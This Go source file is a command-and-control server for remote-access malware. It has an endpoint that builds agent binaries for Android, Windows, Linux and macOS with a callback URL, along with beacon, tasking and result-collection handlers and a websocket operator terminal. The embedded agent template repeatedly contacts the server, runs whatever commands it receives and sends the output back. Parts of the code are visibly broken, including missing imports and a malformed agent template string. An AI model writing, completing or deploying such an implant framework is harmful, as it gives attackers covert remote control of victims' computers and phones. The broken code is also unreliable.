package main

import (
	"bytes"
	_ "embed"
	"encoding/json"
	"flag"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

//go:embed view/dash.html
var dashTmpl string

var (
	cert = flag.String("cert", "", "TLS cert")
	key  = flag.String("key", "", "TLS key")
	port = flag.String("port", "443", "listen port")
)

type task struct {
	ID  string `json:"id"`
	Cmd string `json:"cmd"`
	Arg string `json:"arg"`
}

var (
	clients   = make(map[string]chan task) // agentID → task channel
	clientsMu sync.RWMutex
	upgrader  = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
)

func main() {
	flag.Parse()

	r := mux.NewRouter()
	r.HandleFunc("/api/build", buildHandler).Methods("POST")
	r.HandleFunc("/collect", collect).Methods("POST")
	r.HandleFunc("/ws", wsHandler)
	r.HandleFunc("/dash", dash)
	r.HandleFunc("/task/{id}", getTask).Methods("GET")
	r.HandleFunc("/result", result).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("static")))

	addr := ":" + *port
	log.Println("C2 listening on", addr)
	var err error
	if *cert != "" && *key != "" {
		err = http.ListenAndServeTLS(addr, *cert, *key, r)
	} else {
		err = http.ListenAndServe(addr, r)
	}
	log.Fatal(err)
}

/* ---------- agent builder ---------- */

type buildReq struct {
	OS  string `json:"os"`  // android,windows,linux,darwin
	URL string `json:"url"` // callback https://your-domain.com
}

func buildHandler(w http.ResponseWriter, r *http.Request) {
	var req buildReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad", 400); return
	}
	if req.URL == "" || req.OS == "" {
		http.Error(w, "missing", 400); return
	}
	osarch := map[string]string{
		"android": "android/arm64",
		"windows": "windows/amd64",
		"linux":   "linux/amd64",
		"darwin":  "darwin/amd64",
	}[req.OS]
	if osarch == "" {
		http.Error(w, "bad os", 400); return
	}
	parts := strings.Split(osarch, "/")
	goos, goarch := parts[0], parts[1]

	src := strings.ReplaceAll(tpl, "{{URL}}", req.URL)
	tmp, _ := os.CreateTemp("", "agent-*.go")
	tmp.WriteString(src)
	tmp.Close()

	bin := tmp.Name() + ".bin"
	cmd := exec.Command("go", "build", "-trimpath", "-ldflags", "-s -w",
		"-o", bin, tmp.Name())
	cmd.Env = append(os.Environ(),
		"GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")
	if err := cmd.Run(); err != nil {
		http.Error(w, "build fail", 500); return
	}
	defer os.Remove(bin)
	defer os.Remove(tmp.Name())

	w.Header().Set("Content-Disposition", "attachment; filename=agent."+goos)
	http.ServeFile(w, r, bin)
}

/* ---------- beacon & tasks ---------- */

func collect(w http.ResponseWriter, r *http.Request) {
	var body map[string]interface{}
	json.NewDecoder(r.Body).Decode(&body)
	id := r.Header.Get("X-Agent-ID")
	if id == "" {
		id = "unknown"
	}
	log.Printf("beacon %s : %v", id, body)
	w.WriteHeader(204)
}

func getTask(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	clientsMu.Lock()
	ch, ok := clients[id]
	if !ok {
		ch = make(chan task, 1)
		clients[id] = ch
	}
	clientsMu.Unlock()
	select {
	case t := <-ch:
		json.NewEncoder(w).Encode(t)
	default:
		w.WriteHeader(204)
	}
}

func result(w http.ResponseWriter, r *http.Request) {
	var body map[string]string
	json.NewDecoder(r.Body).Decode(&body)
	log.Printf("result %s : %s", body["id"], body["out"])
	w.WriteHeader(204)
}

/* ---------- web terminal ---------- */

func wsHandler(w http.ResponseWriter, r *http.Request) {
	c, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer c.Close()
	for {
		var t task
		if err := c.ReadJSON(&t); err != nil {
			break
		}
		clientsMu.RLock()
		ch, ok := clients[t.ID]
		clientsMu.RUnlock()
		if ok {
			select {
			case ch <- t:
			default:
			}
		}
	}
}

func dash(w http.ResponseWriter, r *http.Request) {
	tmpl := template.Must(template.New("dash").Parse(dashTmpl))
	tmpl.Execute(w, struct{ URL string }{URL: "wss://" + r.Host + "/ws"})
}

/* ---------- agent template ---------- */

const tpl = `package main
import (
	"bytes"
	"encoding/json"
	"net/http"
	"os"
	"time"
)
var URL = "{{URL}}"
func main() {
	id, _ := os.Hostname()
	for {
		// beacon
		http.Post(URL+"/collect", "application/json",
			bytes.NewReader([]byte(` + "`" + `{"id":"` + "`" + `+id+` + "`" + `"}` + "`" + `)))
		// fetch task
		r, _ := http.Get(URL + "/task/" + id)
		if r != nil && r.StatusCode == 200 {
			var t struct{ Cmd, Arg string }
			json.NewDecoder(r.Body).Decode(&t)
			out, _ := exec.Command(t.Cmd, t.Arg).CombinedOutput()
			http.Post(URL+"/result", "application/json",
				bytes.NewReader([]byte(` + "`" + `{"id":"` + "`" + `+id+` + "`" + `","out":"` + "`" + `+string(out)+` + "`" + `"} ` + "`" + `)))
		}
		time.Sleep(10 * time.Second)
	}
}`
